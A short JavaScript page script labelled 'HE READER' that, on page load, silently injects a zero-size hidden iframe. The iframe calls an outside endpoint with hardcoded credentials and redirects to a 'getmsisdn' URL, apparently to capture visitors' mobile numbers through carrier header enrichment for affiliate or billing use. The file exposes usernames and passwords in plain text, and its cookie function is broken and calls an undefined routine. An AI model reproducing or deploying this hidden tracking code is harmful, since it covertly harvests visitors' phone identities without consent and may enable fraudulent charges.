/*HE READER*/

function setIframe() {
    let ifrm = document.createElement('iframe');
    ifrm.setAttribute('id', 'ifrm');
    ifrm.setAttribute('src', 'http://helm.tekmob.com/pim/omanhe?user=ilovecpa&pass=ilovecpa&redirectURL=http%3A%2F%2Fplayplace.mobi%2Fapi%2Fgetmsisdn%2Ftimwe_om.php%3Fuser%3DM4rhZQMcqF%26pass%3DH5LO54QQPO');
    ifrm.setAttribute('width', '0');
    ifrm.setAttribute('height', '0');
    let el = document.getElementById('lng_select');
    el.parentNode.insertBefore(ifrm, el);
}

function getCookie(name) {
    setTimeout(() => {
        try {
            let value = '; ' + document.cookie;
            let parts = value.split('; ' + name + '=');

            if (parts.length == 2) {
                parts.pop().split(';').shift();
                return he_reader()
            }
            return null;

        } catch (error) {
            console.log(error)
            return undefined
        }
    }, 2500);
}

setIframe()